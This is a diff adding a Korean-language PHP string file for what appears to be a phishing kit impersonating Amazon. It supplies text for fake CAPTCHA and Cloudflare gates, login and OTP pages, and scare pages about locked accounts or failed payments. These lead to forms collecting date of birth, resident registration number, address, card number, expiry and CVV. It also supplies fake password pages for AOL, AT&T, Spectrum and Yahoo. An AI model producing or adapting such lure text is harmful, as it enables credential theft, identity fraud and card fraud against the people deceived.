@@ -1,0 +1,386 @@
+<?php
+// CAPTCHA
+$lang['captcha']['title']           = "주의가 필요합니다! | 보안 확인";
+$lang['captcha']['checking']        = "접속하기 전에 브라우저를 확인하는 중...";
+$lang['captcha']['titlepage']       = "나는 로봇이 아닙니다";
+$lang['captcha']['recaptcha']       = "reCAPTCHA";
+$lang['captcha']['privacy']         = "개인정보 보호 • 약관";
+$lang['captcha']['aboutthepage']    = "이 페이지에 대하여";
+$lang['captcha']['verify_action']   = "아래 작업을 완료하여 사람이 맞는지 확인하세요.";
+$lang['captcha']['notedthepage']    = "시스템에서 귀하의 네트워크에서 비정상적인 트래픽이 감지되었습니다. 이 페이지는 요청을 보내는 사람이 실제 사용자임을 확인하기 위한 것입니다.";
+$lang['captcha']['ipaddress']       = "IP 주소:";
+$lang['captcha']['date']            = "날짜 및 시간:";
+$lang['captcha']['verifying']       = "확인 중...";
+$lang['captcha']['verified']        = "확인 완료";
+
+// CLOUDFLARE
+$lang['cloudflare']['name']          = "Cloudflare";
+$lang['cloudflare']['title']         = "잠시만 기다려 주세요...";
+$lang['cloudflare']['titlepage']     = "사람임을 확인하는 중입니다. 몇 초 정도 걸릴 수 있습니다.";
+$lang['cloudflare']['verifyhuman']   = "사람임을 확인";
+$lang['cloudflare']['privacy']       = "개인정보 보호 • 약관";
+$lang['cloudflare']['verify_action'] = "아래 작업을 완료하여 사람이 맞는지 확인하세요.";
+$lang['cloudflare']['verify_message']= "연결의 보안을 확인해야 합니다.";
+$lang['cloudflare']['verifying']     = "확인 중...";
+$lang['cloudflare']['success']       = "성공";
+$lang['cloudflare']['enable']        = "계속하려면 자바스크립트와 쿠키를 활성화하세요";
+$lang['cloudflare']['know']          = "알고 계셨나요?";
+$lang['cloudflare']['bottraffic']    = "머신 러닝을 사용하여 봇 트래픽을 식별하고 방어하는 회사를 아시나요?";
+$lang['cloudflare']['rayid']         = "Ray ID:";
+
+// PAGE LOGIN
+$lang['login']['language']           = "한국어";
+$lang['login']['title']              = "Amazon 로그인";
+$lang['login']['signin']             = "로그인";
+$lang['login']['titlealertsignin']   = "문제가 발생했습니다";
+$lang['login']['alertsignin']        = "해당 이메일 주소로 된 계정을 찾을 수 없습니다";
+$lang['login']['emailorphone']       = "이메일 또는 휴대폰 번호";
+$lang['login']['usernameEmpty']      = "이메일 또는 휴대폰 번호를 입력하세요";
+$lang['login']['usernameInvalid']    = "유효한 이메일 주소 또는 전화번호를 입력하세요";
+$lang['login']['continue']           = "계속";
+$lang['login']['continuing']         = "계속 진행하면 Amazon의 약관에 동의하는 것입니다";
+$lang['login']['forgot']             = "비밀번호를 잊으셨나요?";
+$lang['login']['other']              = "다른 로그인 문제";
+$lang['login']['change']             = "변경";
+$lang['login']['password']           = "비밀번호";
+$lang['login']['passwordEmpty']      = "비밀번호를 입력하세요";
+$lang['login']['passwordInvalid']    = "비밀번호는 최소 8자 이상이어야 합니다";
+$lang['login']['or']                 = "또는";
+$lang['login']['passkey']            = "패스키로 로그인";
+$lang['login']['showpassword']       = "비밀번호 표시";
+$lang['login']['buyer']              = "업무용으로 구매하시나요?";
+$lang['login']['shop']               = "Amazon Business에서 쇼핑하기";
+$lang['login']['new']                = "Amazon을 처음 이용하시나요?";
+$lang['login']['create']             = "Amazon 계정 만들기";
+$lang['login']['conditions']         = "이용 약관";
+$lang['login']['privacy']            = "개인정보 보호";
+$lang['login']['cookies']            = "쿠키 정책";
+$lang['login']['needhelp']           = "도움이 필요하신가요?";
+$lang['login']['help']               = "도움말";
+$lang['login']['copyright']          = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE OTP
+$lang['otp']['language']             = "한국어";
+$lang['otp']['title']                = "Amazon: 2단계 인증";
+$lang['otp']['titleotp']             = "2단계 인증";
+$lang['otp']['pagetitle']            = "보안을 위해 코드를 이메일로 보냈습니다";
+$lang['otp']['phonepagetitle']       = "추가 보안을 위해 휴대폰 번호로 전송된 일회용 비밀번호(OTP)를 입력하세요";
+$lang['otp']['titlepage']            = "OTP 입력";
+$lang['otp']['otpcheckbox']          = " 이 브라우저에서는 OTP 요구하지 않기";
+$lang['otp']['titlealertotp']        = "문제가 발생했습니다";
+$lang['otp']['otpinvalid']           = "입력한 코드가 올바르지 않습니다. 코드를 확인한 후 다시 시도하세요.";
+$lang['otp']['waiting']              = "다른 코드를 요청하려면 %s초 동안 기다려야 합니다.";
+$lang['otp']['otpEmpty']             = "인증 코드를 입력하세요";
+$lang['otp']['otpInvalid']           = "유효한 인증 코드를 입력하세요";
+$lang['otp']['submitcode']           = "코드 제출";
+$lang['otp']['wait']                 = "잠시 기다려 주세요 ...";
+$lang['otp']['needhelp']             = "도움이 필요하신가요?";
+$lang['otp']['differentway']         = "코드를 받을 수 없거나 이메일/휴대폰 번호를 변경하셨다면, <a href='#gp'>다른 방법 시도</a>.";
+$lang['otp']['conditions']           = "이용 약관";
+$lang['otp']['privacy']              = "개인정보 보호";
+$lang['otp']['cookies']              = "쿠키 정책";
+$lang['otp']['help']                 = "도움말";
+$lang['otp']['copyright']            = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE UNUSUAL
+$lang['unusual']['language']             = "한국어";
+$lang['unusual']['title']                = "아마존: 비정상 활동";
+$lang['unusual']['titleunusual']         = "회원님의 Amazon 계정에서 비정상적인 활동이 감지되었습니다";
+$lang['unusual']['pagetitle']            = "계정을 안전하게 사용하기 전에 몇 가지 단계를 권장합니다.";
+$lang['unusual']['step1']                = "1단계";
+$lang['unusual']['infostep1']            = "결제 청구지 주소 확인";
+$lang['unusual']['alertstep1']           = "회원님의 Amazon 계정에 연결된 청구지 주소를 확인하세요.";
+$lang['unusual']['step2']                = "2단계";
+$lang['unusual']['infostep2']            = "결제 방법 확인";
+$lang['unusual']['alertstep2']           = "누군가가 회원님의 Amazon 계정 결제 방법을 변경하거나 사용한 것으로 보입니다. 따라서 계정에 연결된 결제 정보를 제공해 주셔야 합니다.";
+$lang['unusual']['verifnow']             = "지금 확인";
+$lang['unusual']['needhelp']             = "도움이 필요하신가요?";
+$lang['unusual']['differentway']         = "이 비정상적인 활동이 확실하지 않다면, 지침에 따라 계정을 보호하세요.";
+$lang['unusual']['conditions']           = "이용 약관";
+$lang['unusual']['privacy']              = "개인정보 보호";
+$lang['unusual']['cookies']              = "쿠키 공지";
+$lang['unusual']['help']                 = "도움말";
+$lang['unusual']['copyright']            = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE SUSPICIOUS
+$lang['suspicious']['language']          = "한국어";
+$lang['suspicious']['title']             = "아마존: 결제 문제";
+$lang['suspicious']['titlesuspicious']   = "결제 문제로 인해 회원님의 Amazon 계정이 보류되었습니다";
+$lang['suspicious']['pagetitle']         = "아래 단계를 따라 결제 방법을 업데이트하세요.";
+$lang['suspicious']['step1']             = "1단계";
+$lang['suspicious']['infostep1']         = "결제 청구지 주소 업데이트";
+$lang['suspicious']['alertstep1']        = "회원님의 Amazon 계정에 연결된 청구지 주소를 업데이트하세요.";
+$lang['suspicious']['step2']             = "2단계";
+$lang['suspicious']['infostep2']         = "결제 방법 업데이트";
+$lang['suspicious']['alertstep2']        = "누군가가 회원님의 Amazon 계정 결제 방법을 변경하거나 사용한 것으로 보입니다. 따라서 계정에 연결된 결제 정보를 확인해 주셔야 합니다.";
+$lang['suspicious']['verifnow']          = "지금 확인";
+$lang['suspicious']['needhelp']          = "도움이 필요하신가요?";
+$lang['suspicious']['differentway']      = "이 활동을 인식하지 못했거나 어떻게 해야 할지 모르겠다면, 제공된 단계를 따라 계정을 보호하세요.";
+$lang['suspicious']['conditions']        = "이용 약관";
+$lang['suspicious']['privacy']           = "개인정보 보호";
+$lang['suspicious']['help']              = "도움말";
+$lang['suspicious']['copyright']         = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE LOCKED
+$lang['locked']['language']              = "한국어";
+$lang['locked']['title']                 = "아마존: 접근 제한됨";
+$lang['locked']['titlelocked']           = "보안상의 이유로 계정이 잠겼습니다";
+$lang['locked']['pagetitle']             = "Amazon 계정을 잠금 해제하려면 다음 단계를 즉시 따르시길 권장합니다.";
+$lang['locked']['step1']                 = "1단계";
+$lang['locked']['infostep1']             = "결제 청구지 주소 확인";
+$lang['locked']['alertstep1']            = "회원님의 Amazon 계정에 연결된 청구지 주소를 확인하세요.";
+$lang['locked']['step2']                 = "2단계";
+$lang['locked']['infostep2']             = "결제 방법 확인";
+$lang['locked']['alertstep2']            = "누군가가 회원님의 Amazon 계정 결제 방법을 변경하거나 사용한 것으로 보입니다. 따라서 계정에 연결된 결제 정보를 확인해 주셔야 합니다.";
+$lang['locked']['verifnow']              = "지금 확인";
+$lang['locked']['needhelp']              = "도움이 필요하신가요?";
+$lang['locked']['differentway']          = "이 제한이 실수라고 생각하시거나 이유를 잘 모르신다면, 지침에 따라 계정을 검토하고 보호하세요.";
+$lang['locked']['conditions']            = "이용 약관";
+$lang['locked']['privacy']               = "개인정보 보호";
+$lang['locked']['help']                  = "도움말";
+$lang['locked']['copyright']             = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE PRIME
+$lang['prime']['language']              = "한국어";
+$lang['prime']['title']                 = "아마존: 프라임 멤버십 일시 중지됨";
+$lang['prime']['titleprime']            = "회원님의 Amazon 프라임 멤버십은 " . date("Y년 n월 j일") . "에 갱신 예정입니다";
+$lang['prime']['pagetitle']             = "아래 단계를 따라 결제 방법을 업데이트하세요.";
+$lang['prime']['step1']                 = "1단계";
+$lang['prime']['infostep1']             = "결제 청구지 주소 업데이트";
+$lang['prime']['alertstep1']            = "회원님의 Amazon 계정에 연결된 청구지 주소를 업데이트하세요.";
+$lang['prime']['step2']                 = "2단계";
+$lang['prime']['infostep2']             = "결제 방법 업데이트";
+$lang['prime']['alertstep2']            = "프라임 멤버십에 연결된 카드가 더 이상 유효하지 않은 것으로 확인되었습니다. 따라서 결제 정보를 업데이트해 주셔야 합니다.";
+$lang['prime']['resume']                = "멤버십 재개";
+$lang['prime']['needhelp']              = "도움이 필요하신가요?";
+$lang['prime']['differentway']          = "멤버십을 복원하는 다른 방법을 시도해 보세요.";
+$lang['prime']['conditions']            = "이용 약관";
+$lang['prime']['privacy']               = "개인정보 보호";
+$lang['prime']['help']                  = "도움말";
+$lang['prime']['copyright']             = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE BILLING HEADER
+$lang['billingheader']['language']          = "한국어";
+$lang['billingheader']['titleaddress']      = "Amazon: 주소 확인";
+$lang['billingheader']['titlepayment']      = "Amazon: 결제 확인";
+$lang['billingheader']['deliverto']         = "배송지";
+$lang['billingheader']['done']              = "완료";
+$lang['billingheader']['all']               = "전체";
+$lang['billingheader']['selectdepartment']  = "검색할 부서를 선택하세요";
+$lang['billingheader']['alldepartment']     = "전체 부서";
+$lang['billingheader']['artscrafts']        = "공예/미술";
+$lang['billingheader']['automotive']        = "자동차";
+$lang['billingheader']['baby']              = "베이비";
+$lang['billingheader']['beautypersonal']    = "뷰티/퍼스널 케어";
+$lang['billingheader']['books']             = "도서";
+$lang['billingheader']['boysfashion']       = "남아 패션";
+$lang['billingheader']['computers']         = "컴퓨터";
+$lang['billingheader']['deals']             = "할인 상품";
+$lang['billingheader']['digitalmusic']      = "디지털 음악";
+$lang['billingheader']['electronics']       = "전자제품";
+$lang['billingheader']['girlsfashion']      = "여아 패션";
+$lang['billingheader']['health']            = "건강/가정용품";
+$lang['billingheader']['homekitchen']       = "홈/키친";
+$lang['billingheader']['industrial']        = "산업/과학";
+$lang['billingheader']['searchamazon']      = "아마존 검색";
+$lang['billingheader']['hello']             = "안녕하세요,";
+$lang['billingheader']['accountlist']       = "계정 및 목록";
+$lang['billingheader']['returns']           = "반품";
+$lang['billingheader']['orders']            = "주문";
+$lang['billingheader']['rufus']             = "루푸스";
+$lang['billingheader']['todaysdeals']       = "오늘의 딜";
+$lang['billingheader']['primevideo']        = "프라임 비디오";
+$lang['billingheader']['buyagain']          = "다시 구매";
+$lang['billingheader']['customerservice']   = "고객 서비스";
+$lang['billingheader']['registry']          = "레지스트리";
+$lang['billingheader']['giftcard']          = "기프트 카드";
+$lang['billingheader']['sell']              = "판매하기";
+$lang['billingheader']['disability']        = "장애인 고객 지원";
+$lang['billingheader']['alertaccount']      = "계정이 일시적으로 보류되었습니다";
+$lang['billingheader']['noticealertaccount']    = "고객님의 계정에서 비정상적인 결제 활동이 감지되어, 최근 주문에 사용된 결제 수단의 소유 여부를 확인해야 합니다.";
+
+// PAGE BILLING PAGE
+$lang['billingpage']['verifyaddress']       = "주소 확인";
+$lang['billingpage']['verifypayment']       = "결제 확인";
+$lang['billingpage']['complete']            = "완료";
+$lang['billingpage']['titleverifyaddress']  = "본인 확인";
+$lang['billingpage']['enterinformation']    = "계정과 일치하는 정보를 입력하세요.";
+$lang['billingpage']['country']             = "국가/지역";
+$lang['billingpage']['fullname']            = "성명 (이름과 성)";
+$lang['billingpage']['alertfullname']       = "이름을 입력하세요.";
+$lang['billingpage']['checkalertfullname']  = "성명(이름과 성)을 확인하세요.";
+$lang['billingpage']['dob']                 = "생년월일";
+$lang['billingpage']['alertdob']            = "생년월일을 입력하세요.";
+$lang['billingpage']['checkalertdob']       = "생년월일을 확인하세요.";
+$lang['billingpage']['invalidalertdob']     = "잘못된 날짜입니다. MM/DD/YYYY 형식을 확인하세요.";
+$lang['billingpage']['dobmust17th']         = "만 17세 이상이어야 합니다.";
+$lang['billingpage']['ssn']                 = "주민등록번호";
+$lang['billingpage']['phonenumber']         = "전화번호";
+$lang['billingpage']['alertphonenumber']    = "배송 관련 문제가 있을 경우 연락할 수 있도록 전화번호를 입력하세요.";
+$lang['billingpage']['assistdelivery']      = "배송 지원용으로 사용될 수 있습니다";
+$lang['billingpage']['addressline1']        = "주소 1";
+$lang['billingpage']['alertaddressline1']   = "주소 1을 입력하세요.";
+$lang['billingpage']['placeaddressline1']   = "도로명 주소 또는 사서함";
+$lang['billingpage']['addressline2']        = "주소 2";
+$lang['billingpage']['placeaddressline2']   = "아파트, 호수, 빌딩, 층 등";
+$lang['billingpage']['city']                = "도시";
+$lang['billingpage']['alertcity']           = "도시명을 입력하세요.";
+$lang['billingpage']['state']               = "주/도";
+$lang['billingpage']['alertstate']          = "주/도를 입력하세요.";
+$lang['billingpage']['zipcode']             = "우편번호";
+$lang['billingpage']['alertzipcode']        = "우편번호를 입력하세요.";
+$lang['billingpage']['thismydefault']       = "이 주소를 기본 주소로 설정";
+$lang['billingpage']['backtotop']           = "맨 위로 이동";
+
+// PAGE PAYMENT PAGE
+$lang['paymentpage']['verifyaddress']       = "주소 확인";
+$lang['paymentpage']['verifypayment']       = "결제 확인";
+$lang['paymentpage']['complete']            = "완료";
+$lang['paymentpage']['titleverifypayment']  = "신용/직불카드 확인";
+$lang['paymentpage']['enterinformation']    = "계정과 일치하는 정보를 입력하세요.";
+$lang['paymentpage']['reviewpayment']       = "신용카드 또는 직불카드를 검토하세요";
+$lang['paymentpage']['paymentreview']       = "카드를 확인할 수 없습니다. 다른 카드를 사용하고, 저장하기 전에 정확한지 확인하세요.";
+$lang['paymentpage']['cardname']            = "카드 이름";
+$lang['paymentpage']['alertcardname']       = "카드 이름을 입력하세요.";
+$lang['paymentpage']['checkalertcardname']  = "카드 이름을 확인하세요.";
+$lang['paymentpage']['placecardname']       = "카드 소유자 이름";
+$lang['paymentpage']['cardnumber']          = "카드 번호";
+$lang['paymentpage']['alertcardnumber']     = "카드 번호를 입력하세요.";
+$lang['paymentpage']['checkalertcardnumber']= "잘못된 카드 번호입니다. 올바른 번호를 입력하세요.";
+$lang['paymentpage']['cardexp']             = "만료일";
+$lang['paymentpage']['requirecardexp']      = "만료일을 입력하세요.";
+$lang['paymentpage']['cardexpmust1and12']   = "만료 월은 01~12 사이여야 합니다.";
+$lang['paymentpage']['cardexpmust22and35']  = "만료 연도는 25~35 사이여야 합니다.";
+$lang['paymentpage']['cardexpinvalid']      = "유효한 만료일을 입력하세요.";
+$lang['paymentpage']['cvv']                 = "CVV 입력";
+$lang['paymentpage']['alertcvv']            = "CVV/CSC를 입력하세요.";
+$lang['paymentpage']['checkalertcvv']       = "3~4자리 CVV/CSC를 입력하세요.";
+$lang['paymentpage']['placecvv']            = "3~4자리 코드";
+$lang['paymentpage']['youraddress']         = "나의 주소";
+$lang['paymentpage']['infopayment']         = "귀하의 정보는 암호화되어 안전하게 보호됩니다";
+$lang['paymentpage']['alertinfopayment']    = "서비스 중단을 방지하기 위해 추가된 카드는 다른 결제 수단이 실패할 경우 백업으로 사용될 수 있습니다. 언제든지 내 결제에서 이 설정을 변경할 수 있습니다.";
+$lang['paymentpage']['yourinfoname']        = "전체 이름";
+$lang['paymentpage']['yourinfoaddress']     = "주소";
+$lang['paymentpage']['yourinfocountry']     = "국가";
+$lang['paymentpage']['backtotop']           = "맨 위로 이동";
+
+// PAGE COMPLETED
+$lang['completed']['verifyaddress']       = "주소 확인";
+$lang['completed']['verifypayment']       = "결제 확인";
+$lang['completed']['complete']            = "완료";
+$lang['completed']['titlecomplete']       = "본인 확인 완료";
+$lang['completed']['infocomplete']        = "계정이 확인되는 대로 이메일로 알려드립니다.";
+$lang['completed']['backtotop']           = "맨 위로 이동";
+
+// PAGE BILLING FOOTER
+$lang['billingfooter']['gettoknow']         = "아마존 소개";
+$lang['billingfooter']['careers']           = "채용정보";
+$lang['billingfooter']['blog']              = "블로그";
+$lang['billingfooter']['aboutamazon']       = "아마존에 대하여";
+$lang['billingfooter']['investor']          = "투자자 관계";
+$lang['billingfooter']['amazondevices']     = "아마존 기기";
+$lang['billingfooter']['amazonscience']     = "아마존 사이언스";
+$lang['billingfooter']['makemoney']         = "아마존으로 수익 창출";
+$lang['billingfooter']['sellproducts']      = "아마존에서 제품 판매";
+$lang['billingfooter']['sellbusiness']      = "아마존 비즈니스 판매";
+$lang['billingfooter']['sellapps']          = "아마존 앱 판매";
+$lang['billingfooter']['becomeaffiliate']   = "제휴 파트너 되기";
+$lang['billingfooter']['advertise']         = "제품 광고하기";
+$lang['billingfooter']['selfpublish']       = "셀프 출판하기";
+$lang['billingfooter']['hostamazonhub']     = "아마존 허브 운영";
+$lang['billingfooter']['seemore']           = "더 많은 수익 창출 방법 보기";
+$lang['billingfooter']['amazonpayment']     = "아마존 결제 상품";
+$lang['billingfooter']['amazonbusiness']    = "아마존 비즈니스 카드";
+$lang['billingfooter']['shopwithpoints']    = "포인트로 쇼핑";
+$lang['billingfooter']['reloadbalance']     = "잔액 충전";
+$lang['billingfooter']['amazoncurrency']    = "아마존 환율 변환기";
+$lang['billingfooter']['letushelp']         = "도움이 필요하신가요?";
+$lang['billingfooter']['youraccount']       = "내 계정";
+$lang['billingfooter']['yourorders']        = "내 주문";
+$lang['billingfooter']['shippingrates']     = "배송 요금 및 정책";
+$lang['billingfooter']['returnsreplace']    = "반품 및 교환";
+$lang['billingfooter']['manageyourcontent'] = "콘텐츠 및 기기 관리";
+$lang['billingfooter']['help']              = "도움말";
+$lang['billingfooter']['language']          = "한국어";
+$lang['billingfooter']['symbolmoney']       = "₩";
+$lang['billingfooter']['money']             = "KRW - 대한민국 원";
+$lang['billingfooter']['conditions']        = "이용 약관";
+$lang['billingfooter']['privacy']           = "개인정보 처리방침";
+$lang['billingfooter']['consumer']          = "소비자 건강 데이터 개인정보 보호 공지";
+$lang['billingfooter']['adsprivacy']        = "광고 개인정보 설정";
+$lang['billingfooter']['copyright']         = "© 1996-" . date("Y") . ", Amazon.com, Inc. 또는 그 계열사";
+
+// PAGE AOL
+$lang['emailaol']['title']          = "AOL";
+$lang['emailaol']['enterpassword']  = "비밀번호 입력";
+$lang['emailaol']['finishsignin']   = "로그인 완료";
+$lang['emailaol']['inputpassword']  = "비밀번호";
+$lang['emailaol']['alertfailed']    = "잘못된 비밀번호입니다. 다시 시도해 주세요.";
+$lang['emailaol']['next']           = "다음";
+$lang['emailaol']['forgot']         = "비밀번호를 잊으셨나요?";
+$lang['emailaol']['legacy']         = "AOL은 최신 브라우저 버전에서 최적의 성능을 발휘합니다. 현재 사용 중인 브라우저는 구식이거나 지원되지 않아 일부 기능이 제대로 작동하지 않을 수 있습니다. 브라우저를 최신 버전으로 업데이트하세요. <a href='#'>자세히 보기</a>";
+
+// PAGE ATT
+$lang['emailatt']['title']          = "Login Screen";
+$lang['emailatt']['signin']         = "Sign in";
+$lang['emailatt']['tomyatt']        = "to myAT&T";
+$lang['emailatt']['alertfailed']    = "Incorrect Password, Try again.";
+$lang['emailatt']['carealert']      = "Care code: ";
+$lang['emailatt']['inputpassword']  = "Password";
+$lang['emailatt']['show']           = "Show";
+$lang['emailatt']['keepsignin']     = "Keep me signed in";
+$lang['emailatt']['forgot']         = "Forgot user ID?";
+$lang['emailatt']['donthave']       = "Don't have a user ID?";
+$lang['emailatt']['createone']      = "Create one now";
+$lang['emailatt']['paywithout']     = "Pay without signing in";
+$lang['emailatt']['legal']          = "Legal policy center";
+$lang['emailatt']['privacy']        = "Privacy policy";
+$lang['emailatt']['terms']          = "Terms of use";
+$lang['emailatt']['accessibility']  = "Accessibility";
+$lang['emailatt']['privacychoice']  = "Your privacy choices";
+$lang['emailatt']['copyright']      = "AT&T Intellectual Property. All rights reserved.";
+
+// PAGE CHARTER
+$lang['emailcharter']['title']          = "Login TWC & Roadrunner RR Email | Spectrum Webmail";
+$lang['emailcharter']['skiptocontent']  = "Skip to Main Content";
+$lang['emailcharter']['menu']           = "MENU";
+$lang['emailcharter']['manageaccount']  = "Manage Account";
+$lang['emailcharter']['getsupport']     = "Get Support";
+$lang['emailcharter']['watchtv']        = "Watch TV";
+$lang['emailcharter']['support']        = "Support";
+$lang['emailcharter']['signintomail']   = "Sign In to Webmail";
+$lang['emailcharter']['createemail']    = "Create an Email Address";
+$lang['emailcharter']['emailaddress']   = "Email Address";
+$lang['emailcharter']['emailpassword']  = "Email Password";
+$lang['emailcharter']['signin']         = "Sign In";
+$lang['emailcharter']['forgotemail']    = "Forgot Email Address?";
+$lang['emailcharter']['forgotpassword'] = "Forgot Email Password?";
+$lang['emailcharter']['copyright']      = "2022 Charter Communications. All rights reserved";
+$lang['emailcharter']['withus']         = "Advertise with Us";
+$lang['emailcharter']['privacy']        = "Your Privacy Rights";
+$lang['emailcharter']['policy']         = "Web Privacy Policy";
+$lang['emailcharter']['dontsell']       = "California Consumer Do Not Sell Or Share My Personal Information";
+$lang['emailcharter']['limittheuse']    = "California Consumer Limit The Use Of My Sensitive Personal Information";
+$lang['emailcharter']['subscriber']     = "Spectrum Subscriber Policies";
+$lang['emailcharter']['inc']            = "Time Warner Cable and the Time Warner Cable logo are trademarks of Time Warner Inc., used under license.";
+
+// PAGE HOT FAMILY
+$lang['emailhotfams']['title']              = "계정에 로그인";
+$lang['emailhotfams']['enterpassword']      = "비밀번호 입력";
+$lang['emailhotfams']['alertfailed']        = "잘못된 비밀번호입니다. 다시 시도하세요.";
+$lang['emailhotfams']['forgot']             = "비밀번호를 잊으셨나요";
+$lang['emailhotfams']['signin']             = "로그인";
+$lang['emailhotfams']['terms']              = "이용 약관";
+$lang['emailhotfams']['privacy']            = "개인정보 및 쿠키";
+$lang['emailhotfams']['...']                = "...";
+
+// PAGE Yahoo
+$lang['emailyahoo']['title']            = "Yahoo";
+$lang['emailyahoo']['enterpassword']    = "비밀번호 입력";
+$lang['emailyahoo']['finishsignin']     = "로그인 완료";
+$lang['emailyahoo']['inputpassword']    = "비밀번호";
+$lang['emailyahoo']['alertfailed']      = "잘못된 비밀번호입니다. 다시 시도해 주세요.";
+$lang['emailyahoo']['next']             = "다음";
+$lang['emailyahoo']['forgot']           = "비밀번호를 잊으셨나요?";
+$lang['emailyahoo']['legacy']           = "Yahoo는 최신 브라우저 버전에서 최적의 성능을 발휘합니다. 현재 사용 중인 브라우저는 구식이거나 지원되지 않아 일부 기능이 제대로 작동하지 않을 수 있습니다. 브라우저를 최신 버전으로 업데이트하세요. <a href='#'>자세히 보기</a>";
+?>
